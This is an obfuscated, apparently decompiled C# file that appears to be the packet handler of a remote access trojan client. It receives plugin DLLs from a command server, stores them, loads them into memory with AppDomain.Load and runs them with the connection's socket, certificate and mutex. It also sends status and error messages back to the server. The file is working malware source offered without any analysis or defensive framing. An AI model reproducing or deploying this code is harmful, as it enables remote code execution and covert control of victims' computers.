using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using YspzNDIXLULee;
using jRqllyjXpPF;
using lbBmsCGqmaavDk;
using tXzQcBesFjj;

namespace mQpicvPmEcMJ;

public static class udvtJaQZJQEug
{
	[CompilerGenerated]
	private static class kNnhLcuaeKZADl
	{
		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> rvCRBuHNrPgswC;
	}

	public static List<oBaGoFGSOWPojT> ZvoEulVZBikzj = new List<oBaGoFGSOWPojT>();

	public static void SXhaOVrGwzwP(object sxfWNmWmdKKWa)
	{
		try
		{
			oBaGoFGSOWPojT oBaGoFGSOWPojT = new oBaGoFGSOWPojT();
			oBaGoFGSOWPojT.hnaiBFRrRO((byte[])sxfWNmWmdKKWa);
			switch (oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Packet").UPNpZCCgWUpsQj)
			{
			case "savePlugin":
				TchIfyeUwuXb.JQCvsmfEZeBzCR(oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Hash").UPNpZCCgWUpsQj, oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Dll").HTXWtqsPAAmFp());
				{
					foreach (oBaGoFGSOWPojT item in ZvoEulVZBikzj.ToList())
					{
						if (item.MCNaMOuHJPmBBcg("Dll").UPNpZCCgWUpsQj == oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Hash").UPNpZCCgWUpsQj)
						{
							XxHWDaBKOyPVsiGYoI(item);
							ZvoEulVZBikzj.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (TchIfyeUwuXb.dFTpybzMcRvJV(oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Dll").UPNpZCCgWUpsQj) == null)
					{
						ZvoEulVZBikzj.Add(oBaGoFGSOWPojT);
						oBaGoFGSOWPojT oBaGoFGSOWPojT3 = new oBaGoFGSOWPojT();
						oBaGoFGSOWPojT3.MCNaMOuHJPmBBcg("Packet").ekETxtxcAFPeX("sendPlugin");
						oBaGoFGSOWPojT3.MCNaMOuHJPmBBcg("Hashes").ekETxtxcAFPeX(oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Dll").UPNpZCCgWUpsQj);
						cQQrbWXKEGPe.uwhrwGJNgQ(oBaGoFGSOWPojT3.MrbeXnLKFMlfC());
					}
					else
					{
						XxHWDaBKOyPVsiGYoI(oBaGoFGSOWPojT);
					}
					break;
				}
				catch (Exception ex)
				{
					EUMFuMEVfge(ex.Message);
					break;
				}
			case "pong":
			{
				cQQrbWXKEGPe.eEPTYqRDZXRR = false;
				oBaGoFGSOWPojT oBaGoFGSOWPojT2 = new oBaGoFGSOWPojT();
				oBaGoFGSOWPojT2.MCNaMOuHJPmBBcg("Packet").ekETxtxcAFPeX("pong");
				oBaGoFGSOWPojT2.MCNaMOuHJPmBBcg("Message").nxUHnDsRRJqvipS(cQQrbWXKEGPe.GlMnhsYoBsO);
				cQQrbWXKEGPe.uwhrwGJNgQ(oBaGoFGSOWPojT2.MrbeXnLKFMlfC());
				cQQrbWXKEGPe.GlMnhsYoBsO = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			EUMFuMEVfge(ex2.Message);
		}
	}

	private static void XxHWDaBKOyPVsiGYoI(oBaGoFGSOWPojT teKnKmkmYqT)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(DYzeemrNuqGi.KLKwzFgHTWV(TchIfyeUwuXb.dFTpybzMcRvJV(teKnKmkmYqT.MCNaMOuHJPmBBcg("Dll").UPNpZCCgWUpsQj))).GetType("Plugin.Plugin"));
		val.Run(cQQrbWXKEGPe.VtxGLzBTMyyju, dqIziPtAElY.PExyYCKOWb, dqIziPtAElY.nCfRukxEnMCPvfKsv, teKnKmkmYqT.MCNaMOuHJPmBBcg("Msgpack").HTXWtqsPAAmFp(), FzLnOlOMBK.mkJAsKkkOnUwH, dqIziPtAElY.NumGNzbdYMIc, dqIziPtAElY.SsAYJiqIdvAuDD, dqIziPtAElY.RzlFRsHgglCS);
		SgasFQTmiFNOy();
	}

	private static void SgasFQTmiFNOy()
	{
		oBaGoFGSOWPojT oBaGoFGSOWPojT = new oBaGoFGSOWPojT();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Packet").UPNpZCCgWUpsQj = "Received";
		cQQrbWXKEGPe.uwhrwGJNgQ(oBaGoFGSOWPojT.MrbeXnLKFMlfC());
		Thread.Sleep(1000);
	}

	public static void EUMFuMEVfge(string LKNaOZTGTDh)
	{
		oBaGoFGSOWPojT oBaGoFGSOWPojT = new oBaGoFGSOWPojT();
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Packet").UPNpZCCgWUpsQj = "Error";
		oBaGoFGSOWPojT.MCNaMOuHJPmBBcg("Error").UPNpZCCgWUpsQj = LKNaOZTGTDh;
		cQQrbWXKEGPe.uwhrwGJNgQ(oBaGoFGSOWPojT.MrbeXnLKFMlfC());
	}
}
